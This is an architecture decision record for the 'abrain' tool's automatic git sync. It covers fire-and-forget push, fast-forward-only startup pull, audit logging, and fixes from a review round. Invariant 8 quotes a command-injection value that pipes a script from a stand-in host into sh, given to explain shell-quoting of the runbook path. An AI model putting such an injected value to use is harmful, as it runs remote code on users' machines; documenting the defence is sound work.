# ADR 0020 — Abrain auto-sync to remote (sediment-driven push + startup ff-pull)

- **Status**: Accepted
- **Date**: 2026-05-15
- **Supersedes**: none. Extends [ADR 0014](./0014-abrain-as-personal-brain.md) §B5 (abrain as cross-project knowledge substrate) and [ADR 0017](./0017-project-binding-strict-mode.md) for the cross-device sync gap that ADR 0017's strict binding implicitly assumed someone else would solve.
- **Builds on**: [ADR 0019](./0019-abrain-self-managed-vault-identity.md) — fixed identity drift, but not knowledge drift.

## Context

`~/.abrain` is a git repo. Since the B5 cutover (ADR 0014 §D), sediment writes markdown into it and `gitCommit()` (extensions/sediment/writer.ts:573) auto-commits each entry. The repo has a remote (`origin = git.alfadb.cn/components/abrain.git`).

**The gap**: nothing ever pushed those commits. Discovery 2026-05-15: local was **44 commits ahead of origin/main**, accumulated over weeks of sediment activity. A user with two devices would see:

- Device A: rich, growing knowledge base.
- Device B (cloned weeks ago): frozen in time. None of A's discoveries are visible.

Symmetric problem on the read side: Device B starts pi and doesn't see anything Device A pushed today, because nothing fetches.

ADR 0019 solved **identity** drift (cross-device vault unlock now works). This ADR solves **knowledge** drift.

## Constraints

1. **Must not block sediment's main path.** Sediment's commit happens in `agent_end`; if push takes 5s on a flaky network, agent_end shouldn't hang. Push is fire-and-forget.

2. **Must not auto-resolve conflicts.** Discussed and explicitly rejected:
   - LLM-merge of markdown bodies carries hallucination risk — a single fabricated sentence pollutes the knowledge substrate, and is hard to detect post-hoc.
   - The user requested in the design discussion: "不做自动解决冲突，发生冲突了就提示用户去处理"
   - So: ff-only merge is the only auto-merge strategy. Divergence aborts and surfaces a runbook.

3. **Must work with zero configuration.** Users who have `origin` set should get auto-sync without flipping a flag. Users without `origin` get silent no-op (this ADR doesn't apply to them).

4. **Must never throw to caller.** All git ops capture errors into the audit log and return a typed `GitSyncEvent`. Sediment's existing `try { gitCommit(...); } catch {}` (writer.ts:599 in pre-ADR-0020 code) is too coarse — we add explicit no-throw guarantees per op.

5. **Must not exfiltrate secrets via argv.** Same argv hygiene as ADR 0019 keychain ops: only branch names and standard verbs pass through `execFile`. Credentials live in git's credential helper or SSH agent — neither passes through us.

6. **Must serialize concurrent in-process ops.** Multiple sediment writes during one `agent_end` could call `pushAsync` nearly simultaneously; without single-flight, the second push fails with `.git/index.lock` contention. We use an in-memory promise singleton.

## Decision

Add `extensions/abrain/git-sync.ts` exposing four operations:

| op | trigger | behavior |
|---|---|---|
| `pushAsync` | sediment commit success (writer.ts:573 gitCommit) | fire-and-forget background push; detached, sediment returns immediately |
| `fetchAndFF` | abrain extension activate (pi startup) | fire-and-forget fetch + ff-only merge; divergence aborts |
| `sync` | `/abrain sync` slash command (manual) | combined fetch+push; surfaces runbook on divergence |
| `getStatus` | `/abrain status` slash command | read-only: ahead/behind + last events from audit |

### Result taxonomy

Every op returns `GitSyncEvent { ts, op, result, ahead?, behind?, durationMs?, error? }`. The `result` enum is the source of truth for downstream UX (status command, footer hints):

| `result` | meaning | UX |
|---|---|---|
| `ok` | success | silent (or log line on startup ff) |
| `noop` | nothing to do (ahead=0 push / behind=0 fetch) | silent |
| `skipped` | no git repo / no origin remote | silent — auto-sync doesn't apply |
| `diverged` | local+remote both ahead; ff refused | `/abrain status` warning; `/abrain sync` returns runbook |
| `push_rejected` | remote ahead; user must pull first | retried on next sediment commit (likely after a fetch) |
| `timeout` | git command exceeded 8s | retried on next op; visible in audit |
| `failed` | any other error | error string in audit |

### Audit log

Every op appends one row to `~/.abrain/.state/git-sync.jsonl`. This:

- Lets `getStatus` show "last push: 2026-05-15T19:45 ok 234ms" without re-running git.
- Provides forensic trail when users report "abrain not syncing".
- Bounded read (last 200 KB) so a year of sediment writes doesn't slow `/abrain status`.

### Single-flight in-process lock

```ts
let inflightOp: Promise<GitSyncEvent> | null = null;

async function singleFlight(fn: () => Promise<GitSyncEvent>): Promise<GitSyncEvent> {
  if (inflightOp) await inflightOp.catch(() => undefined);
  const p = fn();
  inflightOp = p;
  try { return await p; } finally { if (inflightOp === p) inflightOp = null; }
}
```

In-process only. Cross-process protection (multiple pi instances on the same machine) relies on git's own `.git/index.lock` — that's the fail-soft path: one wins, the other audits `result=failed` and retries on next op.

### Slash commands

- `/abrain status` — now also displays git sync state (remote URL, branch, ahead/behind, last push/fetch from audit) alongside the existing binding status.
- `/abrain sync` — new. Runs `fetchAndFF` then `pushAsync`. If fetch returns `diverged`, push is skipped and the response includes:

  ```
  diverged: local has N commit(s), remote has M commit(s) not in local.
  ff-only merge refused. resolve manually:
    cd ~/.abrain
    git fetch origin && git status
    # then either: git merge origin/main   (creates merge commit)
    #         or: git rebase origin/main   (replays your commits on top)
    # then run /abrain sync again
  ```

### Disable knob

`PI_ABRAIN_NO_AUTOSYNC=1` env var disables both startup fetch and post-commit push. Useful for:

- CI environments where network access is unreliable
- Offline development
- Smoke tests that should not contact a remote

There is no settings.json equivalent yet — env var is sufficient for the failure cases users actually hit.

## Invariants

1. **Sediment commit path is never blocked by git network ops.** `pushAsync` is fire-and-forget; sediment returns the commit SHA immediately.

2. **No auto-merge beyond fast-forward.** Divergence always aborts. The only auto-merge that runs is `git merge --ff-only` when local has no unique commits.

3. **No throw to caller.** All four public functions catch every error and record to audit. Verified by smoke (`pushAsync({abrainHome: notGit})` returns `skipped`, not throws).

4. **No secrets in argv.** Only branch names and standard git verbs. Credentials come from git credential helper / SSH agent, never from us.

5. **In-process serialization.** Concurrent calls in the same pi process are serialized via a `tail`-chained promise queue (`singleFlight`). Smoke verifies both 2-way and 3-way concurrent pushes produce no `index.lock` contention. A previous (1.0) implementation used a single `inflightOp` slot; that worked for 2 callers but had a TOCTOU race with 3+, fixed in the Round 2 audit follow-up (see §Round 2).

6. **Skipped is silent.** When `hasGitRemote` is false (no git repo or no origin), every op returns `result=skipped` and writes the audit row, but emits no console output. Users without a configured remote see zero noise.

7. **Output-side credential redaction.** Symmetric to invariant 4 (argv-in). Anything captured from git — `git remote get-url origin` stdout, push/fetch stderr embedded in error messages — passes through `redactCredentials()` before storage in `~/.abrain/.state/git-sync.jsonl` or display in `/abrain status`. Closes the asymmetry that argv-in was protected but stderr/stdout-out were not (Round 2 audit finding M1).

8. **Runbook shell-quoting.** The `/abrain sync` divergence runbook contains `cd <abrainHome>` for the user to copy/paste. `abrainHome` is shell-quoted via `shellQuotePath()` so a maliciously-crafted `ABRAIN_ROOT` env (e.g. `/tmp/evil"; curl evil.sh | sh; #`) cannot become a paste-time code-execution gadget (Round 2 audit finding M2).

## Alternatives considered

### A. Synchronous push (block sediment's commit)
**Rejected.** Sediment's contract is "agent_end completes in O(seconds), not O(network)". Blocking on push couples knowledge-write latency to network health.

### B. Debounce push (batch N seconds of commits into one push)
**Rejected.** YAGNI: single-flight already serializes, git pushes are cheap (deltas only), and a sediment burst is typically 1-3 commits. Debounce adds complexity (timer management, shutdown drain) for marginal benefit.

### C. Rebase on diverge
**Rejected.** Auto-rebase rewrites local SHAs silently — users who manually `cd ~/.abrain && git log` would see commits "move around". Knowledge substrate integrity over convenience.

### D. LLM auto-merge of conflicts
**Rejected outright in design discussion.** Hallucination risk in a knowledge substrate is unacceptable. The user explicitly chose "提示用户去处理" over LLM merge. May revisit as a separate ADR if conflict frequency justifies it after 0020 is deployed.

### E. Periodic fetch (every N minutes)
**Deferred.** Startup fetch covers 90% of cases: a user starting a pi session gets the latest knowledge. Mid-session sync is `/abrain sync` (manual). If real usage shows mid-session staleness as a problem, a periodic timer is a small extension.

### F. Settings.json knobs (gitPushOnCommit, gitFetchOnStartup, timeouts)
**Deferred to YAGNI.** Single env var (`PI_ABRAIN_NO_AUTOSYNC`) handles the only knob users actually need (full disable). More granular knobs land if specific scenarios surface (e.g. "I want fetch but not push").

## Implementation

| File | Change |
|---|---|
| `extensions/abrain/git-sync.ts` (new) | Core module: `pushAsync`, `fetchAndFF`, `sync`, `getStatus`, `formatSyncStatus`, `hasGitRemote`, `getAheadBehind`, single-flight lock, audit writer |
| `extensions/abrain/index.ts` | activate() fires `fetchAndFF` on startup (unless `PI_ABRAIN_NO_AUTOSYNC=1`); `/abrain` command gains `sync` subcommand and enhances `status` to include git sync state |
| `extensions/sediment/writer.ts` | `gitCommit()` dynamically requires `../abrain/git-sync` after successful commit and fires `pushAsync` detached |
| `scripts/smoke-abrain-git-sync.mjs` (new) | 20 assertions across 13 sections covering full taxonomy with a local bare repo as fake remote |
| `scripts/smoke-abrain-{backend-detect,vault-identity,secret-scope}.mjs` | Added git-sync.cjs companion to the transpile list (index.ts now imports it) |
| `package.json` | New script `smoke:abrain-git-sync` |

## Operational notes

### What users see when divergence happens

Real scenario: Device A pushed `sediment: create X (project:p1)` 30 minutes ago. Device B has been offline, just sediment-committed `sediment: create Y (project:p1)` locally. B starts pi → startup `fetchAndFF` returns `diverged`. B sees in console:

```
[abrain] git fetch: diverged (local ahead 1, remote ahead 1). Run /abrain sync for resolution runbook.
```

B runs `/abrain sync` → gets the runbook (cd + git merge/rebase choice). B picks `git rebase origin/main`, re-runs `/abrain sync` → success.

### Failure modes that should NOT happen (regression watchlist)

- Sediment commit succeeds but push fails → user thinks knowledge is synced when it isn't. Mitigation: audit log + `/abrain status` shows ahead count. Future TUI footer hint planned for P0e.
- Two pi processes pushing concurrently → one wins, one audits `failed` with `index.lock` error string. Acceptable: the loser will retry on next sediment commit.
- Network down at startup → fetch returns `failed/timeout`, logged once to stderr, audit row written, no further attempts until next pi start or manual `/abrain sync`. Users don't get a permanently noisy startup.

### Where this connects to other ADRs

- **ADR 0014 (abrain as cross-project substrate)**: this ADR is the missing transport layer between devices.
- **ADR 0017 (strict project binding)**: now works cross-device — binding info is part of what auto-sync ships.
- **ADR 0019 (abrain-managed vault identity)**: identity moved to abrain repo, so identity sync is part of abrain sync. `.vault-identity/master.age.pub` enters git and rides this transport; `.vault-identity/master.age` stays gitignored (still must be transported manually per ADR 0019).

## Round 2 audit (2026-05-15, post-6cbc60a)

Three models (opus-4-7 + gpt-5.5 + deepseek-v4-pro) audited the change in parallel. Consensus: ship-quality core (7-7.5/10), no CRITICAL, but five MAJORs and a handful of MINORs needed addressing before relying on this in production.

| Finding | Where | Fix |
|---|---|---|
| **MAJOR-A** `classifyError` regex (English-only) silently mislabels real push rejections as `failed` under non-English `LANG` | git-sync.ts | Added module-level `GIT_ENV` (`LANG=C LC_ALL=C GIT_TERMINAL_PROMPT=0`); threaded into every `execFileAsync` site (7 sites). Dropped bare `/behind/i` from regex. |
| **MAJOR-B** Credential URLs (`https://user:token@host/repo`) leak into `getStatus().remote` UI display + audit `error` field via push stderr | git-sync.ts | Added `redactCredentials()` export, called at both leak sites. Codified as invariant 7. |
| **MAJOR-C** `PI_ABRAIN_DISABLED=1` does not gate `writer.ts:pushAsync` invocation — single-layer enforcement | sediment/writer.ts | Added inline `process.env.PI_ABRAIN_DISABLED !== "1"` to the push gate. ADR 0014 invariant #6 now belt + suspenders. |
| **MAJOR-D** `singleFlight` TOCTOU: with 3+ concurrent callers, multiple microtasks resumed simultaneously after prior inflight resolved and all ran `fn()` in parallel | git-sync.ts | Rewrote as `tail`-chained promise queue. `tail.then(fn, fn)` runs each `fn` strictly after every prior settles (rejected slot prevents poison propagation). New smoke section pins the 3-way regression. |
| **MAJOR-E** `/abrain sync` divergence runbook injects `abrainHome` unquoted into `cd` for user to paste; ABRAIN_ROOT with shell metachars → paste-time RCE | git-sync.ts | Added `shellQuotePath()`; runbook now uses `cd '<quoted>'`. Control-char paths return refusal placeholder. Codified as invariant 8. |
| **MINOR** `git add ${rel}` lacks `--` option-parsing terminator | sediment/writer.ts | Added `"--"` to both gitCommit and gitCommitAbrain. |
| **MINOR** SIGINT (Ctrl-C) was classified as `timeout` | git-sync.ts | `classifyError` now requires `signal === 'SIGTERM'` for `timeout`; SIGINT → `failed`. |
| **MINOR** `classifyError` could label fetch errors as `push_rejected` if stderr matched regex | git-sync.ts | Added `allowPushRejected` parameter; fetch callers pass `false`. |
| **MINOR** Smoke `rmSync` cleanup outside try/finally | smoke-abrain-git-sync.mjs | Wrapped in try/catch. |

Smoke went from 20 to 27 assertions: new sections 13.2 (3-way queue regression), 14 (PI_ABRAIN_NO_AUTOSYNC contract), 15 (redaction + quoting truth tables), 16 (_queueDepth introspection).

Deferred to follow-up (tracked under P0e candidates below, NOT in Round 2 commit):

- Branch/remote detection (currently hardcoded `origin/main`; users on `master` branch silently no-op — gpt #4).
- Smoke for sediment writer's dynamic-require integration (the primary auto-push wiring is currently smoke-bypassed since the smoke direct-requires git-sync — deepseek M1).
- Audit log rotation (append-only; bounded read at 200KB — gpt minor 3).
- Workflow/bind paths don't trigger auto-push (out of ADR 0020 scope but inconsistent — gpt minor 4/5).

## P0e candidates (deferred, recorded for traceability)

1. TUI footer hint when `ahead > 0` for >5 minutes (visible "abrain: N to push") so users notice silent push failures.
2. Periodic fetch (e.g. every 15 min during active session).
3. Conflict-suggestion logging: when divergence is detected, log the conflicting paths to `.state/git-sync.jsonl` so future analysis can quantify how often LLM-merge would have helped.
4. Identity passphrase wrap (ADR 0019 P0d): once `master.age` can enter git, abrain auto-sync becomes the *only* cross-device step needed.
